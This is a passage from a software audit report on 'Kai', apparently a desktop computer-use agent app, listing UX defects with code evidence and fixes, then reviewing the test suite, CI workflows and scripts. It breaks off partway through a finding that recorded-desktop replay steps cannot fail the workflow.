**What:** Tokens are `steps.len() * TOKENS_PER_STEP` (a hardcoded 1,400/step), the "This step's context" UsageBar is always the same fixed slice of the context window, and cost is derived from droplet hourly rate × elapsed. Only the caption discloses that tokens are estimated. The panel pairs these with a real latency pane, so the fabricated numbers inherit the credibility of the measured ones.
**Evidence:**
```rust
const TOKENS_PER_STEP: usize = 1_400;
…
.child(UsageBar::new(CONTEXT_WINDOW).part(
    "This step's context",
    (TOKENS_PER_STEP as f64).min(CONTEXT_WINDOW),
))
…
.child(format!("Tokens are estimated ({TOKENS_PER_STEP} per step). …"))
```
**Impact:** Users tuning cost/context (or diagnosing a near-limit run) are shown flat fictional values that never change per step; the number "1,400" invites false precision.
**Fix:** Wire real per-step usage if the engine exposes it; otherwise replace the TokenCounter/UsageBar with the honest line "Token usage isn't reported by this backend yet" and keep only the measured cost (elapsed × rate). If estimates stay, label the panel "Estimates", not "Usage".

#### APP-UX-05 TimeLimit outcome instructs users to raise a limit that has no control
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/done.rs:28–30`; `crates/kai-app/src/pages/settings.rs:77–79`
**What:** A run that hits the time limit says "Raise it in Settings › Safety," but Settings' Limits row only segments `max_steps` (20/40/80); `max_minutes` is displayed in the sentence and never edited. The step-limit sibling finding (same function) is accurate.
**Evidence:**
```rust
Some(Outcome::TimeLimit) => {
    "Kai hit the time limit before finishing. Raise it in Settings › Safety."
}
```
`settings.rs:77`: `.row(row("Limits", &format!("At most {} steps and {} minutes per task.", app.settings.max_steps, app.settings.max_minutes), SegmentedControl::new("limits", app.settings.max_steps.to_string())…`
**Impact:** The user follows the instruction, finds no minutes control, and loses trust in the guidance exactly when the product failed them.
**Fix:** Add a minutes SegmentedControl/stepper next to steps (or make the copy name the real remedy: "break the task into smaller parts"). Add a test that every `reason()` instruction references controls that exist.

#### APP-UX-06 Render paths do synchronous disk I/O per frame
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/history.rs:167–175`; `crates/kai-app/src/pages/skills.rs:165–183`
**What:** The history detail panel reads `trace.json` and enumerates the frames directory during every render (inside the `.and_then` on `open_trace`), and the skills detail sheet does `read_dir` for scripts/references/assets plus `skill::load` and a `SKILL.md` read each time it renders. Neither is memoized against the trace/skill identity.
**Evidence:**
```rust
let detail = app.pages.open_trace.clone().and_then(|dir| {
    let trace: Trace =
        serde_json::from_str(&std::fs::read_to_string(dir.join("trace.json")).ok()?).ok()?;
```
```rust
for sub in ["scripts", "references", "assets"] {
    if let Ok(rd) = std::fs::read_dir(s.dir.join(sub)) {
```
**Impact:** Every repaint (typing, hover, animation tick) repeats file I/O; on large traces or a big skills library this causes dropped frames and disk chatter, and a slow network-mounted home dir makes the UI feel hung.
**Fix:** Cache parsed `Trace`/frame lists and loaded skill details in `Pages` state, keyed by directory (reuse `reload_history`/`open_skill` change points), or move loads to the background executor and render a placeholder until ready.

#### APP-UX-07 Skills: no delete action, no benchmark runs in details, no no-results state
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/skills.rs:30–45`, `133–152`, `165–203`
**What:** Three gaps in one surface: (1) skills can be disabled or imported but never deleted from `~/.kai/skills`; (2) the details sheet shows files, validity, and markdown, but DESIGN.md:298 promises "the validation result, and benchmark runs"; (3) filtering with a query that matches nothing renders an empty grid with no explanation.
**Evidence:**
```rust
let valid = match kai_core::skill::load(&s.dir) { Ok(_) => InlineMessage::new(Severity::Success, "Valid against the Agent Skill Open Standard."), … };
let md = std::fs::read_to_string(s.dir.join("SKILL.md")).unwrap_or_default();
```
(No delete/remove call site exists in the file; search results come solely from the filter at `skills.rs:34–45`.)
**Impact:** Users cannot remove a skill they imported by mistake (only hide it), the details sheet underdelivers the documented review workflow, and a zero-match search looks broken.
**Fix:** Add a destructive "Delete skill" button with confirm (remove the folder; it's user-owned data), render `ui::empty("No skills match …")` when the query filters everything out, and either wire benchmark runs into the sheet or amend DESIGN.md:298.

#### APP-UX-08 Benchmark run is mock-only and silently no-ops when the CLI is missing
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/bench.rs:159–165`, `172–173`, `317`
**What:** `run_bench` requires a `kai` binary next to the app executable; if it's absent the function returns before `bench_running = true`, so pressing "Run benchmark (mock)" does nothing at all — no spinner, no toast. The command always runs `--backend mock`, so every result in the table is a mock run regardless of the user's configured backend (the button label and a backend column partially disclose this).
**Evidence:**
```rust
let Some(exe) = std::env::current_exe().ok().and_then(|p| {
    p.parent().map(|d| d.join(if cfg!(windows) { "kai.exe" } else { "kai" }))
}) else {
    return;
};
…
.args(["bench", "--backend", "mock"])
```
**Impact:** A dead-feeling button (no feedback) plus a benchmark page that can never measure the user's actual backend makes the whole page read as demo furniture.
**Fix:** On missing binary, toast "Benchmark tool not found" and disable the button; add a backend selector (default to the configured backend, keep "Mock sample" as an explicit option) or rename the page "Sample benchmark data" if real runs aren't planned.

#### APP-UX-09 i18n table has 19 keys; most user-visible copy is hardcoded inline
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/i18n.rs:6–29`; e.g. `crates/kai-app/src/pages/done.rs:21–34`, `settings.rs:81–89`, `onboarding/steps.rs:87–103`
**What:** `EN` covers app chrome (nav, home headline, done buttons) but every other string is a literal in the page files — outcome reasons, all Settings labels, onboarding copy, bench toasts. DESIGN.md's strings-in-one-table claim does not match the code, and the `t()` fallback logs `strings: no {key:?}`, so callers of new keys silently show the key unless the table is updated.
**Evidence:**
```rust
const EN: &[(&str, &str)] = &[
    ("app.name", "Kai"),
    …
    ("done.trace", "View trace"),
];
```
`done.rs:26`: `"Kai hit the step limit before finishing. Raise it in Settings › Safety, or break the task into smaller parts."` (literal, not a key).
**Impact:** Copy edits require code changes in many files; a future locale has no seam; audits can't diff strings against docs. Consistency debt that grows with every page.
**Fix:** Decide the policy: either move all user-visible copy into `EN` (mechanical, per file) or amend DESIGN.md to scope i18n to chrome only. In the meantime, change `t()`'s miss path to compile-time-checked constants if the framework allows.

#### APP-UX-10 Safety section is a wall of 11 "— experimental" switches
**Severity:** MEDIUM
**Location:** `crates/kai-app/src/pages/settings.rs:81–105`
**What:** Eleven toggles (executor, verify, macro history, memo, task checks, procedures, best-of, recover, browser, …) are stacked in Safety, each ending in "— experimental", with no grouping, defaults rationale, or "reset to recommended". The visual weight and hedge-word repetition make the section unreadable and invite random toggling of behavior-affecting flags.
**Evidence:**
```rust
.row(Switch::new("use-executor", app.settings.use_executor).label("Fast executor: a local decision model (jevos) carries out Gemma's plan — experimental")…)
.row(Switch::new("verify-outcomes", app.settings.verify_outcomes).label("Check the result before \"done\": … — experimental")…)
```
**Impact:** Users either ignore real safety controls or flip experimental behavior without understanding it; support surface for bugs caused by toggle soup.
**Fix:** Move experimental switches behind an "Advanced — experimental" disclosure (collapsed by default), group by purpose (verification, memory, browser), and add a "Reset to defaults" action. Consider dropping the suffix once a flag graduates.

#### APP-UX-11 Stopped run is headlined "Kai couldn't finish" with "You stopped Kai."
**Severity:** LOW
**Location:** `crates/kai-app/src/pages/done.rs:21–34`, `105–116`; `i18n.rs:25`
**What:** `Outcome::Stopped` uses the generic failure headline `done.failure` ("Kai couldn't finish") while the reason line correctly says "You stopped Kai." The page blames Kai for a user-requested stop.
**Evidence:**
```rust
Some(Outcome::Stopped) => "You stopped Kai.",
…
t(cx, "done.failure", &[])
…
.child(reason(outcome)),
```
`i18n.rs:25`: `("done.failure", "Kai couldn't finish")`.
**Impact:** Small emotional/trust papercut after Stop, which is a safety feature users should feel good about using.
**Fix:** Pick the headline per outcome: "Stopped" / "Kai stopped" for `Stopped`, keep "Kai couldn't finish" for Failed/StepLimit.

#### APP-UX-12 History frame strip is a static image where users expect inspection
**Severity:** LOW
**Location:** `crates/kai-app/src/pages/history.rs:215–217`; vendor `agent/previews.rs:119`, `134`
**What:** `BrowserPreview` is constructed without `.on_show(...)`. In the vendored component, the strip is pressable only when `on_show` is set (`pressable = self.on_show.is_some()`), so the frames render as a scrollable-but-inert strip: no enlarge, no open, no keyboard navigation to a frame.
**Evidence:**
```rust
.children((!shots.is_empty()).then(|| {
    BrowserPreview::new("trace-frames", "Frames", shots.clone(), shots.len() - 1)
}))
```
**Impact:** Frames are the best evidence of what happened during a run; a strip that responds to hover/press affordances inconsistently (it does scroll) reads as broken.
**Fix:** Pass `on_show` to open the frame full-size (or select it for a detail pane), and give the strip an aria label; alternatively render it as clearly non-interactive thumbnails.

#### APP-UX-13 Skills search with zero matches shows an unexplained empty grid
**Severity:** LOW
**Location:** `crates/kai-app/src/pages/skills.rs:30–45`, `145–152`
**What:** The grid renders `cards` filtered by the query; when the filter matches nothing, the page shows the search input and an empty area with no message, while "No skills of your own yet" only covers the no-own-skills case.
**Evidence:**
```rust
.child(SearchInput::new("skill-search", &app.pages.skill_search))
.child(div().grid().grid_cols(2).gap(px(12.)).children(cards))
.children((!has_own).then(|| {
    EmptyState::new("no-own", IconName::Puzzle, "No skills of your own yet")
```
**Impact:** A typo in search looks like data loss; users may conclude their skills disappeared.
**Fix:** When `app.pages.skill_search` is non-empty and `cards` is empty, render `ui::empty("No skills match “query”", "Clear the search or import a folder.")`.

#### APP-UX-14 Onboarding hardware spinner can persist forever on probe failure
**Severity:** LOW
**Location:** `crates/kai-app/src/onboarding/local.rs:28–36`; `crates/kai-app/src/local.rs:200–217`
**What:** The spinner "Looking at this computer's memory and graphics…" shows while `hardware.is_none()`. The probe result is applied only `if let Ok(hw) = rx.await` — if the blocking task panics or the channel drops, no code ever sets an error or retries, so the local-model section spins indefinitely with no Cancel or alternative hint.
**Evidence:**
```rust
if l.hardware.is_none() {
    return div().flex().items_center().gap_2()
        .child(Spinner::new("ob-hw"))
        .child("Looking at this computer's memory and graphics…")
```
```rust
if let Ok(hw) = rx.await { local.update(cx, |l, cx| { l.set_hardware(hw); cx.notify(); }); }
```
**Impact:** A rare failure traps the "Run on this computer" path in a loading state that never resolves; the user must restart onboarding blind.
**Fix:** Handle `Err` by showing an inline error with Try again (re-run `detect_local`) and keep the cloud/API options selectable regardless of probe state.

#### APP-UX-15 Mini window can show Approve/Skip buttons whose press silently does nothing
**Severity:** LOW
**Location:** `crates/kai-app/src/mini.rs:202–221`; `crates/kai-app/src/state.rs:113–114`, `401`
**What:** The buttons render whenever `phase == Waiting && !has_human`. `EngineEvent::NeedsHuman` sets `Waiting` before the `Ui::Human` payload arrives (state.rs:401), and `answer_approval` returns `None` when no approval is shown (`self.approval.as_ref()?`), so a press in that window — or an Approve within `APPROVE_GRACE` (600 ms, state.rs:95) — produces no answer and no feedback.
**Evidence:**
```rust
let answers = (waiting && !has_human).then(|| { … Button::new("mini-approve", "Approve") … });
```
```rust
pub fn answer_approval(&mut self, choice: ApprovalChoice) -> Option<Pending> {
    self.approval.as_ref()?;
```
**Impact:** The mini window is the emergency/quick surface; a press that does nothing (especially "Stop") undermines exactly the moment trust matters most.
**Fix:** Gate `answers` on `r.approval.is_some()` instead of phase alone; when a press can't be delivered, toast "Nothing is waiting for you" (mini window already shows live status).

#### APP-UX-16 DESIGN.md says team runs can't be steered; Orchestrator is wired with steering
**Severity:** LOW
**Location:** `docs/DESIGN.md:212–213`; `crates/kai-app/src/agent.rs:293–295`
**What:** The design doc states "Team runs can't be steered yet (sub-agents use `NoSteering`); the composer says so." The team path builds the Orchestrator with `steering: control` (the same control channel used for interrupts), so either the doc is stale or the steering is accepted but never reaches sub-agents — both are worth resolving in one place.
**Evidence:**
```rust
let orch = Orchestrator {
    client: fast.as_ref(),
    …
    interrupt: control,
    sink: &sink,
    steering: control,
```
**Impact:** Documentation and code disagree about a user-facing capability; reviewers can't tell which behavior is intended.
**Fix:** Confirm Orchestrator steering behavior against the vendored orchestrator; update DESIGN.md (and the composer copy) to match, or pass `NoSteering` if team steering is deliberately off.

### Fillers inventory

| File:line | What the user sees | Type | Fix |
| --- | --- | --- | --- |
| `running.rs:27–28`, `304–323` | "Usage" panel: token counter, context bar, cost from `TOKENS_PER_STEP = 1_400` | dummy data (disclosed estimate) | Wire real engine usage or replace panel with honest "not reported" copy. |
| `running.rs:314–317` | "This step's context" bar showing a fixed 1,400/context slice every step | static status | Drive from model-reported usage or remove. |
| `running.rs:318–323` | Cost estimator derived from droplet rate × elapsed | dummy data (rate is real, usage isn't) | Keep only if labeled "Cost of server time", which is actually measured. |
| `home.rs:22–53` | Six starter cards tied to built-in skill names only | dummy/static catalog | Derive from installed skills; label fixed list as examples. |
| `home.rs:386` | "Start from a skill" eyebrow with zero cards when none installed | static heading | Hide section when `cards` is empty. |
| `bench.rs:159–165` | Pressing "Run benchmark (mock)" can do nothing (missing `kai` binary) | dead control | Toast + disable state on missing binary. |
| `bench.rs:172–173`, `317` | Benchmark always runs `--backend mock` | stub | Backend selector or retitle the page as sample data. |
| `onboarding/local.rs:28–36` | Spinner "Looking at this computer's memory and graphics…" can persist on probe failure | stuck state (not fake data) | Error row + Try again on `rx` failure. |
| `capture.rs` (whole file), `capture_models.rs` (whole file) | Made-up runs, models, and telemetry shown only when `KAI_CAPTURE*` is set | test-only fixture (env-gated) | Keep; never ship enabled; document in README so auditors don't file it as product data. |

### Not needed / remove

- `done.failure` as the headline for `Outcome::Stopped` (APP-UX-11): replace with a stop-specific string; the generic failure banner should not exist for a user-requested stop.
- The TokenCounter/UsageBar pair in `running.rs` until real usage exists (APP-UX-04): the cost line can stay; fabricated bars should not.
- `STARTERS` in its current form (APP-UX-03): demote to "examples" shown only when the user has no skills, or delete in favor of installed-skill cards.
- "Run benchmark (mock)" as the page's single primary action (APP-UX-08): if real benchmarks aren't planned, remove the button and title the page "Sample benchmark data".
- 11 experimental switches inline in Safety (APP-UX-10): not removed, but they should not be first-class rows next to core safety choices.

### What's good

- Session rail accessibility is the app's best work: tracked tab-stop focus handles, `role(Button)`, aria labels combining task + status, focus ring, and reveal-once scrolling (`sessions.rs:90–130`), with named rail destinations (`app.rs:328–359`) — U07/U08/U16 are genuinely fixed, not papered over.
- Brand discipline: palette and both themes are verified by WCAG AA tests including subtle text on canvas/surface and ember-as-text (`brand.rs:113–142`).
- Transcript follow policy is a pure, tested module (`follow.rs`) with a real jump-to-latest affordance wired in `running.rs:146–199`; the U05 fix is architectural, not cosmetic.
- Honest empty state in History ("Saved runs appear here with their timelines and frames. Recording is controlled in Settings › Privacy.") — `history.rs:242–252`.
- Onboarding safety copy is candid: "Autopilot still always asks for payments and passwords." (`steps.rs:97`) and three real stop paths (`steps.rs:103`).
- Small-print honesty exists where estimates are shown: "Tokens are estimated (1,400 per step)…" (`running.rs:324–331`) — the fix for APP-UX-04 is to make the panel match the caption, not to add trust warnings.
- Test guard rails: the UI-thread keychain guard (`keys.rs:38`), unique-i18n-keys test (`i18n.rs:55–62`), and the in-workspace vendor scroll contract test (`ui.rs:371–374`) show a culture of pinning fixes with tests.

### Open questions

- Is `runs_dir` training data ever surfaced (size, delete) outside Settings? Recorder writes it (`agent.rs:348–372`), but no page reads it in this scope — is that intentional (headless fine-tuning source) or an unfinished loop?
- Does the engine emit real token/context usage anywhere the UI could consume, or is the vendor estimator (`chat/params.rs` TokenCounter/CostEstimator) the only source by design?
- Can `RunState` learn its trace directory at run start? That would make APP-UX-01 a one-line lookup instead of a heuristic.
- DESIGN.md:298 promises benchmark runs in the skill details sheet — planned, or abandoned in favor of the Benchmarks page?
- Is the 19-key i18n table the intended full policy (chrome only) or the first slice of a full-string migration? DESIGN.md's wording suggests the latter; the code suggests the former.
- For APP-UX-02: should deleting training data be coupled to the history wipe, or a separate control in Privacy? The dialog currently implies the former while the layout suggests the latter.

---

## 3.9 TEST — Test suite, CI, scripts

*Reviewed files: 77. Findings: 0C / 2H / 7M / 3L / 3I.*

### Scope covered

Read in full (no section was skimmed; verdicts are per file). Crate source modules were additionally enumerated for the coverage map.

#### kai-core e2e and support (crates/kai-core/tests/, 6794 lines, 30 test files + 4 support mods)

- [x] best_of_e2e.rs (74) — best-of explains the pick; counting client; fine.
- [x] cancellation_e2e.rs (134) — stop flag honoured between actions; deterministic.
- [x] client_gemini.rs (66) — Gemini wire shape against a scripted HTTP server; realism good.
- [x] client_jev.rs (130) — Jev verifier against scripted responses incl. 403 disable path.
- [x] client_jevos.rs (122) — jevos executor selection against scripted server.
- [x] client_openai.rs (206) — OpenAI wire shape, strict-schema quirks, mock-only (documented).
- [x] computer_contract.rs (210) — native-tool contract: validation, coercion, refusal paths.
- [x] computer_dispatch.rs (208) — dispatch of native actions onto the fake screen/hands.
- [x] computer_model_e2e.rs (101) — model replies driving the computer loop.
- [x] computer_protocol.rs (57) — protocol round-trips.
- [x] cua_native.rs (426) — OpenAI native CUA loop against a mock server; not wired to human checks (documented).
- [x] executor_e2e.rs (290) — transcript executor; skipped-approval semantics asserted on text.
- [x] fast_batch.rs (165) — batched `then` actions and refusal rules.
- [x] fast_observe.rs (318) — tree-only cadence, marks, plan cache; temp dir keyed by PID (see TEST-08).
- [x] human_e2e.rs (530) — captchas/OTP/questions end-to-end; strongest human-check coverage. Over the 500-line rule (documented).
- [x] loop_e2e.rs (316) — core loop: repair, stall brake, repeat-command brake.
- [x] macro_history_e2e.rs (101) — macro history prompt stability.
- [x] mcp_e2e.rs (217) — MCP: approvals skipped/annotated, tool surface.
- [x] memo_e2e.rs (109) — memo on/off byte-identical prompt assertions.
- [x] memory_e2e.rs (405) — recall/learn/consolidate flows with a store in temp.
- [x] privacy_e2e.rs (278) — redaction, screenshot opt-out; timestamped temp dirs.
- [x] procedure_e2e.rs (169) — procedures replay deterministic steps.
- [x] read_page_e2e.rs (163) — read_page flag offered only by page-reading eyes; hostile text withheld.
- [x] recover_e2e.rs (59) — recovery diagnosis off/on.
- [x] reply_salvage_e2e.rs (39) — cut-reply salvage cases incl. the risk-cut guard.
- [x] safety_e2e.rs (229) — injection/phishing/payment guards at the harness level.
- [x] safety_focus_e2e.rs (197) — target-scoped effect checks, focused-field typing.
- [x] subagents.rs (128) — team sub-agents; contains a 50 ms sleep (TEST-09).
- [x] task_checks_e2e.rs (90) — done-gate seeded from task words; fails without seeding (mutation-checked per docs).
- [x] verify_e2e.rs (387) — outcome ledger + DONE gate; the documented guarantee table maps to real tests (verified, see TEST-14).
- [x] common/mod.rs (294) — MockClient/Screen/Hands fakes; scripted, deterministic, call-counting.
- [x] client_support/mod.rs (137) — scripted HTTP/S server for client tests.
- [x] executor_support/mod.rs (216) — executor fakes.
- [x] verify_support/mod.rs (223) — FakeProbe and ledger helpers.

#### kai-core src test modules (2886 lines, 13 files)

- [x] executor_tests.rs (161) — executor prepare/apply rules; good assertion density.
- [x] failure_tests.rs (168) — failure taxonomy classification.
- [x] human_tests.rs (298) — phrase tables, redaction, ask budget; table-driven.
- [x] ledger_tests.rs (117) — model cannot set status; refused probe keeps outcome.
- [x] prompt_tests.rs (195) — prompt stability/byte-identity assertions.
- [x] risk_tests.rs (302) — word-boundary risk matching; 30 tests.
- [x] settings_tests.rs (189) — settings round-trips and defaults.
- [x] task_checks_tests.rs (108) — derives checks from the bench prompts; 11 positives + 12 negatives.
- [x] memory/tests.rs (259), memory/tests_store.rs (385) — store/scrub/consolidate; temp dir by PID.
- [x] models/hub_tests.rs (239), models/rank_tests.rs (232) — catalog parsing, ranking, untested-model rule.
- [x] procedure_tests.rs (233) — procedure parse/match; temp dir by PID.

#### kai-os tests (1653 lines, 6 files)

- [x] browser_edges.rs (320) — dialogs/tabs/dropdowns/file pickers/dead browser against real Chromium; **skips and passes when no browser** (TEST-01).
- [x] browser_lane.rs (389) — real-browser e2e; same skip pattern; one `#[ignore]`d desktop-vs-lane test.
- [x] driver_matrix.rs (275) — multi-toolkit AT-SPI matrix; `#[ignore]`d; skip-as-pass for missing fixtures (TEST-04).
- [x] local_install.rs (342) — local runtime supervision against a fake llama-server; Linux-only cfg; `free_port()` race (TEST-09).
- [x] local_support/mod.rs (207) — fake runtime/server helpers.
- [x] web_support/mod.rs (120) — scripted page server + lane helpers.

#### kai-cli / kai-app inline tests

- [x] kai-cli/src/bench/tests.rs (279) — stats percentiles, merge, skip accounting; solid.
- [x] kai-cli/src/bench/executor_tests.rs (85) — bench executor wiring.
- [x] kai-cli/src/data/tests.rs (151) — export/stats; temp dir by PID.
- [x] kai-app/src/state_tests.rs (238) — state/outcome text, run queue behaviour.
- [x] kai-app/src/pages/skills_tests.rs (38) — skills page helpers only; the rest of the UI has no tests (TEST-06).

#### Workflows (.github/workflows/)

- [x] ci.yml (52) — **paused to workflow_dispatch** (TEST-03); otherwise fmt/clippy/test/skills/mock-bench matrix is well-formed.
- [x] macos.yml (83) — clippy+test+bundle+live check+app capture+replay; live check gated by a verdict step, replay is not (TEST-02).
- [x] windows.yml (77) — same shape as macos.yml; replay non-gating (TEST-02); capture count gate is `> 0` (TEST-05).
- [x] release.yml (97) — tag builds test with `cargo test --workspace --release` (CI paused), package, checksum, smoke-test, publish; no secrets in yml.
- [x] screenshots.yml (72) — Xvfb capture then commits PNGs back; weak count gate (TEST-05); commit step can target the default branch (TEST-10).

#### Scripts (scripts/)

- [x] macos/bundle.sh (77) — strict mode; scoped `rm -rf`; ad-hoc codesign verified; smoke-tests bundled CLI; `--install` overwrite documented.
- [x] macos/live_check.sh (62) — strict mode; real TextEdit checks; `sleep 4` + `sed` output parsing are brittle (TEST-12).
- [x] desktop/install.sh (60) — strict mode; apt + Firefox ESR; no checksum for the tarball; temp dir leaks on failure (TEST-11).
- [x] desktop/start.sh (122) — intentionally sourced (no `set -e`); careful liveness checks; timing sleeps (0.1–0.3 s) are tolerant loops, acceptable.
- [x] desktop/run.sh (16) — `set -e` only (no `-u`/`pipefail`), but the script is a thin exec wrapper; acceptable.
- [x] desktop/stop.sh (22) — no strict mode, but kill failures are deliberately tolerated; `pkill -f` scoped to our display.
- [x] icons/build.sh (61) — strict mode; trap cleanup; deterministic icon regeneration.
- [x] icons/extract-mark.swift (263) — one-off image tool, no tests; prints calibration output; fine.

#### Docs cross-checked for claims

- [x] docs/VERIFICATION.md (335) — every guarantee-table test name exists in code (checked mechanically); "all 361 tests that existed before" is stale (≈650 today, TEST-14).
- [x] docs/HUMAN_CHECKS.md (172) — claimed helpers/tests exist; taxonomy terms are values, not functions.
- [x] docs/DRIVER_MATRIX.md (76) — matches driver_matrix.rs expectations and known-gap logic.
- [x] DECISIONS.md (1007) — every deviation flagged below is deliberate/documented unless stated; checked before assigning severity.
- [x] docs/AUDIT_2026_10_15.md (482) — pre-existing audit; A18 already covers the paused-CI/continue-on-error class (cited in findings).

### Verdict

This is a genuinely strong test layer for a solo-built agent: ~650 test functions, an e2e suite per feature behind feature flags, scripted HTTP/wire-shape tests for every client, a real-headless-browser e2e suite, a fake llama-server supervision suite, and a mutation-style guarantee table (docs/VERIFICATION.md) where each guard was removed to confirm its test fails. The shared fakes (common/mod.rs, client_support, verify_support) are deterministic, call-counting and assertion-friendly, and the fault-injection tests (stall brake, repeat-command brake, cut replies, skipped approvals) are real regressions that were previously found live.

The weaknesses are almost entirely about **enforcement**, not authoring. CI is deliberately paused to workflow_dispatch (documented, owner's request), the two real-desktop replay steps on macOS/Windows are `continue-on-error: true` with no verdict step, `kai bench` always exits 0 anyway, and the ten real-browser tests silently return-pass when no Chromium is found — and no workflow installs one. Capture workflows gate on `>10` or `>0` PNGs instead of the ~60 expected screens. The driver matrix (the only real multi-toolkit AT-SPI check) is `#[ignore]`d and treats missing fixtures as skips. In other words: a green workflow today proves compilation, unit tests, bundle smoke tests and (on macOS) the gated TextEdit live check — but not the browser lane, not the Linux desktop matrix, not eye-and-hand behavior on Windows, and not that the recording playback still passes.

Determinism is mostly good (no network in tests, scripted servers, bounded waits), with a handful of classic hazards: `temp_dir()` keys from `std::process::id()` (stale-state collisions across runs and concurrent test binaries), a `free_port()` bind-then-release race plus post-drop sleeps in local_install.rs, and a 50 ms sleep in subagents.rs. Realism of the model mocks is high for wire formats (multipart, SSE, thinkingConfig refusal, 429 rotation) and deliberately mock-only for the OpenAI native loop and macOS/Windows a11y code paths, which are documented as such.

Maintainability is good: every deviation I flagged was already documented in DECISIONS.md or the audit, test-support modules are shared rather than duplicated, and reasons on the two `#[ignore]`s are accurate. The main maintenance debts are the untested app UI (26 of ~45 kai-app files with no tests), platform-specific modules with no unit tests at all on their own platform, and CI scripts that will need a deliberate re-arm before the repo's public submission. Scores: coverage 6, determinism 6, realism 7, CI quality 5, maintainability 7.

### Coverage map

| Source module | Tests | Gaps |
|---|---|---|
| kai-core engine/* (18 files) | e2e: loop, executor, verify, safety, human, memo, recover, procedure, macro history, best-of, fast batch/observe; unit: act, batch, effect, fresh, observe, privacy | No unit tests in gate.rs, human.rs, model_step.rs, execute.rs, run.rs, computer.rs, record.rs, recover.rs, procedure.rs, best_of.rs; logic covered only through e2e fakes. Acceptable but gate/human logic is security-adjacent. |
| kai-core client/* | scripted-server tests: gemini, openai, vllm (via client_openai/gemini/vllm), jev, jevos; unit: failover, stream, mock | client/mod.rs has no tests; real providers never exercised live in CI (by design: no keys). |
| kai-core computer/+cua | e2e: computer_contract, computer_dispatch, computer_model, computer_protocol, cua_native | cua/provider.rs, cua/mapping.rs, cua_protocol.rs, computer/{action,dispatch,schema,validate} covered only via e2e; provider only against mock server (documented). |
| kai-core memory/* | tests.rs, tests_store.rs, memory_e2e, privacy_e2e, verify_support | learn/promote/scope/reflect/scrub have no direct unit modules (e2e indirect). |
| kai-core risk/untrusted/schema/reply/shell_ro/task_checks/ledger/trace/plan_cache/recorder/skill/prompt | unit test modules each | None significant; strongest area. |
| kai-os a11y/* | unit: mod, active, events, linux, linux_act, live, macos_roles | **UNTESTED: macos.rs, macos_act.rs, windows.rs, windows_act.rs** (verified only by macos.yml live check; Windows UIA not wired — documented). |
| kai-os web/* | unit: lane, act, look, snapshot, dialog, dropdown, keys, release, computer; e2e: browser_lane, browser_edges | **UNTESTED: cdp.rs** (402 lines, protocol/pipe); e2e silently skipped without a browser (TEST-01). |
| kai-os local/* | unit: mod, runtime, server, disk, hardware; e2e: local_install (Linux-only) | **UNTESTED: download.rs, hub.rs**; supervision checks only on Linux. |
| kai-os frame/marks/zoom/window/input/input-tests/kill/launch/perceive/probe/shell/desktop/notify | unit tests present | **UNTESTED: exclude.rs, input/clipboard.rs, input/execute.rs, permissions.rs, secrets.rs (keychain), computer.rs.** Keychain read guard is tested app-side (kai-app keys.rs source guard). |
| kai-cli bench/* | stats/report/repeat/merge via bench/tests.rs; executor via executor_tests.rs | **UNTESTED directly: lane.rs, machine.rs, record.rs, runner.rs** (runner exercised by mock/replay smoke runs). |
| kai-cli data/* | export/stats via data/tests.rs | export.rs partially covered. |
| kai-cli root | console, memory, backend, ab have inline tests | **UNTESTED: main.rs, mcp.rs (skips approvals, documented), models.rs, runs.rs**; no `crates/kai-cli/tests/` (no CLI e2e via assert_cmd). |
| kai-app | state_tests, skills_tests + inline tests in keys, switcher, team, local, control, follow, brand, errors, i18n, approval, pages/{bench,history,models,models_card,models_store,panes}, onboarding/steps | **UNTESTED: agent.rs, anim.rs, app.rs, chrome.rs, mini.rs, nav.rs, runs.rs, store.rs, ui.rs, human_dialog.rs, local_api.rs, browser.rs, main.rs, onboarding/{mod,local}.rs, pages/{capture,capture_models,done,home,memory,model_settings,mod,running,sessions,settings}.rs** — no UI/integration test; screenshots workflow is manual. |

Coverage: ~650 test functions total: kai-core src 276, kai-core e2e ~162, kai-os src 125 + e2e 18, kai-cli 27, kai-app 50 (attribute count; a few cfg-gated).

### Findings

#### [TEST-01] Real-browser e2e tests silently pass when no browser is installed — and no workflow installs one

- **Severity:** HIGH
- **Location:** crates/kai-os/tests/browser_lane.rs:89-93,119-123; crates/kai-os/tests/browser_edges.rs:31-35,102-106 (and each test's early return); crates/kai-os/src/web/lane.rs:34-74; .github/workflows/*.yml (no Chromium install, no `KAI_BROWSER`)
- **What:** `lane()` returns `None` and prints "no Chromium-family browser found (set KAI_BROWSER); skipping" when `find_browser()` fails; every test then `return`s and the test harness reports it as passed. No workflow installs a Chromium-family browser or sets `KAI_BROWSER`, `find_browser()` looks for bare names on `PATH` (no `.exe` variant, so it also misses the Windows runner's Chrome), and Ubuntu 24.04 packages Chromium as a snap, which the project itself documents as unusable in containers (scripts/desktop/install.sh:5).
- **Evidence:** browser_lane.rs:90-92 `let Some(browser) = find_browser() else { eprintln!("...skipping"); return None; }`; browser_lane.rs:121-123 `let Some((lane, _profile)) = lane().await else { return; }`; browser_edges.rs:33-35 same pattern; `grep -rn "KAI_BROWSER\|chromium\|chrome" .github/workflows/` returns nothing; lane.rs:34-41 names include no Windows `.exe`.
- **Impact:** The ten tests that cover dialogs freezing the page, tab open/close races, native dropdowns, file pickers, downloads, dead-browser handling and busy profiles are decorative in every automated run. The CDP implementation (web/cdp.rs) has no unit tests either, so this whole headline feature (browser lane, A/B'd in DECISIONS) is enforced only by manual runs on a developer machine.
- **Fix:** Install a pinned Chromium in at least the Ubuntu CI job (or `npx playwright install chromium`-style download in a dedicated job) and set `KAI_BROWSER`; add an env flag (e.g. `KAI_REQUIRE_BROWSER_TESTS=1`) that turns the skip into a failure in CI so the suite cannot silently degrade; add `.exe` candidates on Windows.

#### [TEST-02] Recorded-desktop replay on macOS/Windows cannot fail the workflow — no verdict step and `kai bench` always exits 0

- **Severity:** HIGH
- **Location:** .github/workflows/macos.yml:64-68; .github/workflows/windows.yml:61-66; crates/kai-cli/src/bench/mod.rs:357
- **What:** Both replay steps are `continue-on-error: true` and have no compensating verdict step (contrast macos.yml:81-83, which checks `steps.live.outcome == 'failure'` for the live check). Even if `continue-on-error` were removed, `kai bench` ends with `Ok(ExitCode::SUCCESS)` unconditionally, so a run where every recorded task fails would still exit 0.
